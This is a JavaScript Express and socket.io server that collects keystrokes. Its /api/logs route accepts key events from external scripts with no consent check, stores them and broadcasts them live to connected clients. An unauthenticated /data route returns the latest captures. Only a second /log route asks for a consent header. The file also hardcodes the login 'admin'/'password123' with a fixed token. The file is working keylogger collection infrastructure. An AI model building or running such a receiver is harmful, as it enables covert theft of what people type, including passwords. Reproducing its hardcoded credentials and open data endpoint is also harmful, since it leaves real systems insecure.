import express from 'express';
import cors from 'cors';
import http from 'http';
import { Server } from 'socket.io';

const app = express();
// const PORT = 5000;
const PORT = process.env.PORT || 3001;

// Global error handlers to capture crashes and unhandled promise rejections
process.on('uncaughtException', (err) => {
  console.error('UNCAUGHT EXCEPTION', err && err.stack ? err.stack : err);
});
process.on('unhandledRejection', (reason, promise) => {
  console.error('UNHANDLED REJECTION at:', promise, 'reason:', reason);
});

// Log when the process exits
process.on('exit', (code) => {
  console.log('Process exiting with code', code);
});

// CORS: accept local dev origins and allow credentials. Also support ALLOWED_ORIGINS env var (comma-separated).
const allowedDevOrigins = [
  "http://localhost:5173",
  "http://127.0.0.1:5173",
  "http://localhost:5174",
  "http://127.0.0.1:5174"
];

// Read ALLOWED_ORIGINS from env (comma separated). If provided, merge with defaults.
const envAllowed = process.env.ALLOWED_ORIGINS ? process.env.ALLOWED_ORIGINS.split(',').map(s => s.trim()).filter(Boolean) : null;
const allowedOrigins = envAllowed ? Array.from(new Set([...envAllowed, ...allowedDevOrigins])) : allowedDevOrigins;

app.use((req, res, next) => {
  // simple request logger
  console.log(`${new Date().toISOString()} ${req.method} ${req.url} origin=${req.headers.origin || '-'} ip=${req.ip}`);
  next();
});

app.use(cors({
  origin: (origin, cb) => {
    if (!origin) return cb(null, true); // allow tools like curl
    // Allow when origin is known
    if (allowedOrigins.includes(origin)) return cb(null, true);
    // Allow in development if NODE_ENV is not production and origin matches dev defaults
    if (process.env.NODE_ENV !== 'production' && allowedDevOrigins.includes(origin)) return cb(null, true);
    // Deny by returning false (do not throw) so requests do not cause server error.
    console.warn('Blocked CORS origin:', origin);
    return cb(null, false);
  },
  credentials: true,
  allowedHeaders: ['Content-Type','Authorization','X-Consent']
}));

app.options('*', cors());
app.use(express.json());

const server = http.createServer(app);
const io = new Server(server, {
  cors: { origin: allowedDevOrigins }
});

// server-level error logging
server.on('error', (err) => {
  console.error('SERVER ERROR', err && err.stack ? err.stack : err);
});

// Optional: log socket connections
io.on('connection', (socket) => {
  console.log('Socket connected', socket.id);
  socket.on('disconnect', (reason) => console.log('Socket disconnected', socket.id, reason));
});

// LOGIN ROUTE: This is where your React app sends the login data
app.post('/', (req, res) => {
  const { username, password } = req.body;
  if (username === 'admin' && password === 'password123') {
    return res.json({ token: "demo-session-token" });
  }
  res.status(401).json({ error: "Invalid credentials" });
});

// In-memory keystrokes storage (keeps only recent entries in memory)
const keystrokes = [];
const MAX_LOGS = 10000; // safety cap

// LOGGING ROUTE: For external scripts to report keystrokes
app.post('/api/logs', (req, res) => {
  const entry = {
    key: req.body.key ?? req.body.k ?? req.body.event ?? 'unknown',
    time: req.body.time ?? new Date().toISOString(),
    meta: req.body.meta ?? null
  };
  // keep capped list
  keystrokes.push(entry);
  if (keystrokes.length > MAX_LOGS) keystrokes.shift();

  // emit to connected clients
  io.emit('new_keystroke', entry);
  res.json({ ok: true });
});

// Convenience route for UI logging (accepts a single key) with consent header
app.post('/log', (req, res) => {
  if ((req.headers['x-consent'] || '').toLowerCase() !== 'true') {
    return res.status(403).json({ error: 'Consent header required' });
  }
  const entry = { key: req.body.key, time: new Date().toISOString() };
  keystrokes.push(entry);
  if (keystrokes.length > MAX_LOGS) keystrokes.shift();
  io.emit('new_keystroke', entry);
  res.json({ ok: true });
});

// DATA route: returns count and optional sample
app.get('/data', (req, res) => {
  res.json({ count: keystrokes.length, latest: keystrokes.slice(-10).reverse() });
});

// Health check
app.get('/health', (req, res) => res.json({ status: 'ok', pid: process.pid }));

// Start server and bind to all interfaces to avoid IPv4/IPv6 binding issues
server.listen(PORT, '0.0.0.0', () => {
  console.log(`API Server running on http://0.0.0.0:${PORT} (pid=${process.pid})`);
});